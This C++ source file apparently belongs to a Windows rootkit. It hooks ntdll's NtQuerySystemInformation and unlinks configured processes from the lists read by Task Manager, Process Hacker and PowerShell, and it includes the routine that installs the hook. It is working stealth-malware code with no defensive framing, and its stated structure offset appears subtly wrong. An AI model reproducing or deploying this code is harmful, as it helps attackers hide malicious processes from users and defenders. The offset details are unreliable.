/*
 * hide_proc.cpp - Hide configured processes from process enumeration.
 *
 * Hooks ntdll!NtQuerySystemInformation and filters the process list
 * returned by SystemProcessInformation (5), SystemExtendedProcess-
 * Information (57) and SystemFullProcessInformation (88). Task Manager's
 * "Processes" tab uses 5/57, the "Details" tab uses 88 on Windows 10+.
 *
 * Entry layout (x64, Windows 7 through 11):
 *
 *   +0x00 ULONG  NextEntryOffset;
 *   +0x04 ULONG  NumberOfThreads;
 *   ...
 *   +0x40 UNICODE_STRING ImageName;      (Length, MaximumLength, Buffer)
 *   +0x58 HANDLE  UniqueProcessId;
 *
 * Matching entries are unlinked through their NextEntryOffset chain so
 * every consumer (taskmgr, Process Hacker, powershell Get-Process, ...)
 * walks a consistent, gap-free list.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/rknt.h"
#include "../common/hook.h"
#include "../common/config.h"

#include <string.h>
#include <stddef.h>

#define RK_SPI_IMAGENAME_OFFSET 0x40
#define RK_SPI_CLASS_PROC       5
#define RK_SPI_CLASS_EXT        57
#define RK_SPI_CLASS_FULL       88
#define RK_SPI_NAME_MAX_CCH     260      /* UNICODE_STRING caps at 520 bytes */

typedef RK_pfn_NtQuerySystemInformation pfn_NtQSI;

static pfn_NtQSI     Real_NtQuerySystemInformation = NULL;
static volatile LONG g_installed                   = 0;

/* Returns 1 when the image name matches a [HideProcess] rule. */
static int process_matches(const rk_config *cfg, const wchar_t *image)
{
    int i;
    for (i = 0; i < cfg->process_count; ++i)
        if (rk_wcsw(cfg->processes[i], image))
            return 1;
    return 0;
}

/* Copy a UNICODE_STRING into a bounded, NUL-terminated buffer. */
static void copy_ustr(wchar_t *dst, size_t dst_cch, const UNICODE_STRING *us)
{
    size_t n = (size_t)us->Length / sizeof(WCHAR);
    if (n >= dst_cch)
        n = dst_cch - 1;
    if (n)
        memcpy(dst, us->Buffer, n * sizeof(WCHAR));
    dst[n] = 0;
}

/*
 * Walk the SYSTEM_PROCESS_INFORMATION chain and unlink hidden entries.
 *
 * 'ret' is the caller's ReturnLength output; it is only needed when the
 * FIRST entry has to be removed (the remaining data must be shifted).
 * Callers that pass ReturnLength == NULL keep the first entry visible.
 */
static void filter_spi(rk_config *cfg, void *buffer, PULONG ret)
{
    unsigned char *cur  = (unsigned char *)buffer;
    unsigned char *prev = NULL;

    while (cur)
    {
        ULONG          next_off = *(ULONG *)(void *)cur;
        unsigned char *next     = next_off ? cur + next_off : NULL;

        UNICODE_STRING *name = (UNICODE_STRING *)(cur + RK_SPI_IMAGENAME_OFFSET);
        int             hide = 0;

        /*
         * Sanity-check the UNICODE_STRING before touching Buffer: the
         * offset is build-specific enough that a mismatch would otherwise
         * dereference arbitrary memory.
         */
        if (name->Buffer && name->Length && name->Length <= RK_SPI_NAME_MAX_CCH * 2 &&
            name->MaximumLength >= name->Length && name->MaximumLength <= 0x1000)
        {
            wchar_t tmp[RK_SPI_NAME_MAX_CCH];
            copy_ustr(tmp, RK_SPI_NAME_MAX_CCH, name);
            hide = process_matches(cfg, tmp);
        }

        if (hide)
        {
            if (prev)
            {
                /* Bridge the predecessor over the current entry. */
                ULONG *pn = (ULONG *)(void *)prev;
                if (next_off == 0)
                    *pn = 0;              /* cur was the last entry */
                else
                    *pn += next_off;
                cur = next;
            }
            else if (next && ret && *ret >= next_off)
            {
                /* First entry: shift the remaining data over it. */
                memmove(buffer, (char *)buffer + next_off, (size_t)(*ret - next_off));
                *ret -= next_off;
                cur  = (unsigned char *)buffer;
                prev = NULL;
            }
            else
            {
                /* Never leave the caller with an empty list. */
                cur = next;
            }
            continue;
        }

        prev = cur;
        cur  = next;
    }
}

static NTSTATUS NTAPI Hooked_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS st = Real_NtQuerySystemInformation(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);

    (void)SystemInformationLength;

    if (NT_SUCCESS(st) && SystemInformation &&
        (SystemInformationClass == RK_SPI_CLASS_PROC ||
         SystemInformationClass == RK_SPI_CLASS_EXT  ||
         SystemInformationClass == RK_SPI_CLASS_FULL))
    {
        rk_config cfg;
        rk_config_snapshot(&cfg);
        if (cfg.process_count)
            filter_spi(&cfg, SystemInformation, ReturnLength);
    }
    return st;
}

extern "C" int rk_hide_process_install(void)
{
    void *target, *orig;
    int   rc;

    if (InterlockedExchange(&g_installed, 1))
        return 0;

    target = rk_proc(L"ntdll.dll", "NtQuerySystemInformation");
    if (!target)
    {
        g_installed = 0;
        return 1;
    }

    rc = rk_hook(target, (void *)&Hooked_NtQuerySystemInformation, &orig);
    if (rc != 0)
    {
        g_installed = 0;
        return rc;
    }

    Real_NtQuerySystemInformation = (pfn_NtQSI)orig;
    return 0;
}
